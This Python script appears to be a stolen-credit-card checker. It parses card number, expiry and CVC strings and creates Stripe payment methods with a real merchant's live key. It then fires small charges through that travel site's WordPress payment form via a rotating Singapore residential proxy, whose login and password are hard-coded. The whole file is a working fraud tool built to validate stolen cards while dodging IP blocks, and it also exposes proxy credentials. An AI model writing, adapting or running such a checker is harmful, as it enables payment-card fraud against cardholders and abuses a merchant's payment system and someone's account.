import requests, re
import random
import string

# ==========================================
# 👇 PROXY SETTINGS (Singapore Proxy Updated 🇸🇬)
# ==========================================
PROXY_HOST = 'geo.g-w.info'
PROXY_PORT = '10080'

# 🔥 မင်းပေးတဲ့ Singapore Proxy User String အသစ်
PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-z0lzlwrj-country-SG-rotation-15'

PROXY_PASS = 'EJJT0uWaSUv4yUXJ'
# ==========================================

# Proxy String တည်ဆောက်ခြင်း
proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {
    'http': proxy_url,
    'https': proxy_url
}

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]

        # 🔥 Random Email Logic
        letters = string.ascii_lowercase + string.digits
        random_name = ''.join(random.choice(letters) for i in range(10))
        random_email = f"{random_name}@gmail.com"

        # ==========================================
        # Step 1: Create Payment Method (Stripe)
        # ==========================================
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = (
            f'type=card&card[number]={n}&card[cvc]={cvc}'
            f'&card[exp_month]={mm}&card[exp_year]={yy}'
            f'&guid=NA&muid=NA&sid=NA'
            f'&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element'
            f'&key=pk_live_51QhDDVHWPpZcisLuMwjv1ViU8uCO57CpVHEkbM1kqmtEjJeIqjpaWdkV1v1aJIZzTsfQrSwP87AbhnkJLjXzF3yS00YCnP2Wym'
        )

        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            proxies=proxies, # 🔥 Proxy Active
            timeout=30 # Timeout ကို 30s တိုးထားတယ် (SG မို့ ပိုငြိမ်အောင်)
        )

        # JSON Error Catch
        if 'id' not in response.json():
            return "Proxy Blocked or Invalid Card (PM Failed) ❌"
            
        pm = response.json()['id']

        # ==========================================
        # Step 2: Charge Request (Benidorm Holidays)
        # ==========================================
        headers = {
            'authority': 'www.benidormholidays.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.benidormholidays.com',
            'referer': 'https://www.benidormholidays.com/payments/',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wp_full_stripe_inline_payment_charge',
            'wpfs-form-name': 'MakeAPayment',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount-unique': '5',
            'wpfs-custom-input[]': 'Super ',
            'wpfs-card-holder-email': random_email,
            'wpfs-card-holder-name': 'Super Z',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }

        response = requests.post(
            'https://www.benidormholidays.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            proxies=proxies, # 🔥 Proxy Active
            timeout=30 # Timeout ကို 30s တိုးထားတယ်
        )
        
        # HTML/Cloudflare Error Catch
        try:
            result = response.json()['message']
        except:
            if "Cloudflare" in response.text or response.status_code == 403:
                result = "IP Blocked by Site ❌"
            else:
                result = "Decline⛔"

    except Exception as e:
        result = f"System Error: {e}"
        
    return result
